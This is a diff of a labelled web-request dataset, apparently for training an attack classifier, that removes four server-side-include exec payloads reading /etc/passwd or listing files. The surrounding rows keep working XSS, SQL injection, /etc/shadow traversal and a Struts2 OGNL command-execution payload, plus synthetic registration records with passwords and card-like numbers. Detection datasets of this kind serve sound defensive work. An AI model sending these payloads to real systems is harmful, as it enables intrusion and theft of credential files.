@@ -325,7 +325,6 @@ global/titulo.jsp,normal
 "<img src=x onerror=\x32""javascript:alert(1)"">",xss
 "<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",xss
 /..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/shadow,traversal
-"<!--#exec cmd=""cat /etc/passwd"" --><br/>",ssi
 "<body background=javascript:'""><script>alert(navigator.userAgent)</script>></body>",xss
 imagenes/logo.gif,normal
 publico/registro.jsp?modo=registro&login=clampitt&password=ba94aridad&nombre=Raphael&apellidos=Chisvert&email=zelda_hjelm5%40silver-knights.it&dni=70892292J&direccion=Calle+Hernandez+Iglesias%2C+160%2C+&ciudad=Pe%F1alsordo&cp=26135&provincia=Badajoz&ntc=4474255756033041&B1=Registrar,normal
@@ -1768,7 +1767,6 @@ global/menum.jsp,normal
 admin') or '1'='1'#,sqli
 """<a href=""""about:<script>document.write(""""XSS-XSS-XSS"""");</script>"""">""",xss
 &lt;HTML&gt;&lt;BODY&gt;,xss
-"<!--#exec cmd=""mail Florian Roth @4nc4p <mailto:Florian Roth @4nc4p> < cat /etc/passwd"" --><br/>",ssi
 &#x03C;,xss
 "<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",xss
 like,sqli
@@ -3222,7 +3220,6 @@ miembros/imagenes/zarauz.jpg,normal
 %253cscript%253ealert(1)%253c/script%253e,xss
 %uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216%uff0e%uff0e%u2216{FILE},traversal
 "<html><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS<SCRIPT DEFER>document.vulnerable=true</SCRIPT>""></BODY></html>",xss
-"<!--#exec cmd=""/bin/ls /"" --><br/>",ssi
 <IMG SRC=”javascript:alert(‘XSS’);”>,xss
 "<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;""></BODY></HTML>",xss
 miembros/salir.jsp,normal
@@ -9071,7 +9068,6 @@ publico/entrar.jsp?errorMsg=Credenciales+incorrectas,normal
 "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','echo windows--2017'}:{'/bin/bash','-c','echo linux--2017'})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",code_injection
 "&lt;HTML xmlns&#58;xss&gt;&lt;?import namespace=\""xss\"" implementation=\""http&#58;//ha&#46;ckers&#46;org/xss&#46;htc\""&gt;&lt;xss&#58;xss&gt;XSS&lt;/xss&#58;xss&gt;&lt;/HTML&gt;",xss
 "ABC<div style=""x:\xE2\x80\x84expression(javascript:alert(1)"">DEF",xss
-"<!--#exec cmd=""find / -name *.* -print"" --><br/>",ssi
 imagenes/logo.gif,normal
 miembros/imagenes/ogono.jpg,normal
 publico/registro.jsp?modo=registro&login=keighley&password=ca26lot9&nombre=Denice&apellidos=Mompel+Urdi&email=harkin%40escapadajoven.gq&dni=11696227Z&direccion=Calle+Fresno%2C+66%2C+10%3FD&ciudad=Valdehorna&cp=17743&provincia=Valladolid&ntc=7840274194886704&B1=Registrar,normal
